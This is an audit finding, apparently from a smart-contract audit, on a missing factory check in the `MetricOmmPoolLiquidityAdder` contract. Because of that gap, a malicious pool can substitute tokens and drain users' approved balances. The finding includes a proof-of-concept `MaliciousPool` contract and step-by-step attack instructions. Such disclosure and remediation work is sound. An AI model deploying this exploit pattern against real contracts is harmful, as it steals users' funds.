### Title
Unvalidated Pool Address in `MetricOmmPoolLiquidityAdder` Allows Malicious Pool to Drain User Tokens via Callback Token Substitution — (File: `metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol`)

---

### Summary

`MetricOmmPoolLiquidityAdder` accepts any arbitrary `pool` address without validating it against the factory registry. During callback settlement, the contract fetches `token0`/`token1` directly from `IMetricOmmPool(msg.sender).getImmutables()` — i.e., from the caller itself. A malicious pool can return arbitrary token addresses, causing the contract to pull the wrong tokens from the user's wallet, bypassing the user's intended denomination caps.

---

### Finding Description

The `addLiquidityExactShares` and `addLiquidityWeighted` entry points accept a caller-supplied `pool` address with no factory allowlist check. The NatSpec at line 19–21 explicitly acknowledges this: [1](#0-0) 

The internal `_addLiquidity` helper stores the caller-supplied pool as the *expected* callback caller in transient storage, then immediately calls `addLiquidity` on it: [2](#0-1) 

Inside `metricOmmModifyLiquidityCallback`, the only caller check is:

```solidity
if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
```

Because `expectedPool` was set to the attacker-controlled address, this check trivially passes. The callback then fetches token addresses from the caller: [3](#0-2) 

A malicious pool can return any `token0`/`token1` from `getImmutables()`. The `pay()` calls then pull those arbitrary tokens from the victim's wallet up to the user-supplied `max0`/`max1` caps — which were denominated in the *expected* token's units, not the substituted token's units.

---

### Impact Explanation

**Token substitution attack:** A victim intending to add liquidity to a USDC/WETH pool sets `maxAmountToken0 = 1000e6` (1 000 USDC) and `maxAmountToken1 = 1e18` (1 ETH). A malicious pool returns `token0 = WBTC` (8 decimals) and `token1 = USDC` (6 decimals). The contract then executes:

```
pay(WBTC, victim, maliciousPool, 1000e6)   // 1 000e6 satoshis = 10 WBTC ≈ $600 000
pay(USDC, victim, maliciousPool, 1e18)     // bounded by victim's USDC approval
```

The victim's `max0` cap was set in USDC units but is applied to WBTC, causing a value loss orders of magnitude larger than intended. Loss is bounded only by the victim's token approvals to the `LiquidityAdder` contract.

**Severity: Medium** — requires the victim to interact with a malicious pool address (e.g., via a phishing UI or a counterfeit pool deployed at a plausible address), and requires the victim to hold prior approvals for the substituted tokens. No privileged access is needed by the attacker.

---

### Likelihood Explanation

Any unprivileged actor can deploy a contract implementing `IMetricOmmPoolActions` and `IMetricOmmPool`. The `MetricOmmPoolLiquidityAdder` has no reference to the factory and performs zero registry checks. Users who grant standing max-approvals to the `LiquidityAdder` (a common pattern) are permanently exposed. The `MetricOmmSimpleRouter` stores a `factory` address in its constructor but `MetricOmmPoolLiquidityAdder` does not, making the latter the weaker surface. [4](#0-3) 

---

### Recommendation

Add a factory allowlist check before calling `addLiquidity` on the supplied pool. The factory already exposes `isPool(address)`: [5](#0-4) 

In `MetricOmmPoolLiquidityAdder`:
1. Store the factory address as an immutable in the constructor.
2. In `_addLiquidity`, add: `if (!IMetricOmmPoolFactory(FACTORY).isPool(pool)) revert UnknownPool(pool);`
3. Remove the reliance on `IMetricOmmPool(msg.sender).getImmutables()` for token addresses in the callback; instead, read them from the factory-verified pool or cache them before the call.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {IMetricOmmPoolActions} from "@metric-core/interfaces/IMetricOmmPool/IMetricOmmPoolActions.sol";
import {IMetricOmmPool, PoolImmutables} from "@metric-core/interfaces/IMetricOmmPool/IMetricOmmPool.sol";
import {IMetricOmmPoolLiquidityAdder} from "metric-periphery/contracts/interfaces/IMetricOmmPoolLiquidityAdder.sol";
import {LiquidityDelta} from "@metric-core/types/PoolOperation.sol";

contract MaliciousPool {
    address public immutable adder;
    address public immutable stolenToken0; // e.g. WBTC
    address public immutable stolenToken1; // e.g. USDC

    constructor(address _adder, address _t0, address _t1) {
        adder = _adder; stolenToken0 = _t0; stolenToken1 = _t1;
    }

    // Called by LiquidityAdder._addLiquidity
    function addLiquidity(address, uint80, LiquidityDelta calldata, bytes calldata, bytes calldata)
        external returns (uint256, uint256)
    {
        // Trigger callback with max amounts
        IMetricOmmPoolLiquidityAdder(adder).metricOmmModifyLiquidityCallback(
            1000e6,   // amount0Delta — victim's max0 cap
            1e18,     // amount1Delta — victim's max1 cap
            abi.encode(uint8(1)) // KIND_PAY
        );
        return (1000e6, 1e18);
    }

    // Returns WBTC/USDC instead of the expected USDC/WETH
    function getImmutables() external view returns (PoolImmutables memory imm) {
        imm.token0 = stolenToken0; // WBTC
        imm.token1 = stolenToken1; // USDC
    }
}

// Attack:
// 1. Deploy MaliciousPool(adder, WBTC, USDC)
// 2. Victim calls adder.addLiquidityExactShares(MaliciousPool, victim, 0, deltas, 1000e6, 1e18, "")
//    thinking max0=1000 USDC, max1=1 ETH
// 3. MaliciousPool.addLiquidity() fires callback with amount0=1000e6, amount1=1e18
// 4. Callback passes msg.sender==expectedPool check
// 5. getImmutables() returns token0=WBTC, token1=USDC
// 6. pay(WBTC, victim, MaliciousPool, 1000e6) → 10 WBTC stolen
// 7. pay(USDC, victim, MaliciousPool, 1e18)   → bounded by victim's USDC approval
``` [6](#0-5) [7](#0-6)

### Citations

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L19-21)
```text
/// @dev The caller is responsible for supplying a legitimate pool address and other non-malicious parameters.
///      This contract does not verify the pool against the factory; a malicious pool can request token pulls up to
///      the caller-provided max caps during callback settlement.
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L22-37)
```text
contract MetricOmmPoolLiquidityAdder is IMetricOmmPoolLiquidityAdder, PeripheryPayments {
  // ============ Constants ============

  uint256 internal constant WAD = 1e18;

  uint8 internal constant KIND_PROBE = 0;
  uint8 internal constant KIND_PAY = 1;

  uint256 private constant T_SLOT_PAY_PAYER = 0;
  uint256 private constant T_SLOT_PAY_POOL = 1;
  uint256 private constant T_SLOT_PAY_MAX0 = 2;
  uint256 private constant T_SLOT_PAY_MAX1 = 3;

  // ============ Constructor ============

  constructor(address weth) PeripheryPayments(weth) {}
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L56-68)
```text
  function addLiquidityExactShares(
    address pool,
    address owner,
    uint80 salt,
    LiquidityDelta calldata deltas,
    uint256 maxAmountToken0,
    uint256 maxAmountToken1,
    bytes calldata extensionData
  ) external payable override returns (uint256 amount0Added, uint256 amount1Added) {
    _validateOwner(owner);
    _validateDeltas(deltas);
    return _addLiquidity(pool, owner, salt, deltas, msg.sender, maxAmountToken0, maxAmountToken1, extensionData);
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L162-178)
```text
    (address expectedPool, address payer, uint256 max0, uint256 max1) = _loadPayContext();
    if (expectedPool == address(0)) revert CallbackContextNotActive();
    if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
    if (amount0Delta > max0 || amount1Delta > max1) {
      revert MaxAmountExceeded(amount0Delta, amount1Delta, max0, max1);
    }

    PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
    address token0 = imm.token0;
    address token1 = imm.token1;
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
    }
    _clearPayContext();
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L192-196)
```text
  ) internal returns (uint256 amount0Added, uint256 amount1Added) {
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
    try IMetricOmmPoolActions(pool)
      .addLiquidity(positionOwner, salt, deltas, abi.encode(KIND_PAY), extensionData) returns (
      uint256 a0, uint256 a1
```

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L149-151)
```text
  function isPool(address pool) external view override returns (bool) {
    return poolToIdx[pool] != 0;
  }
```
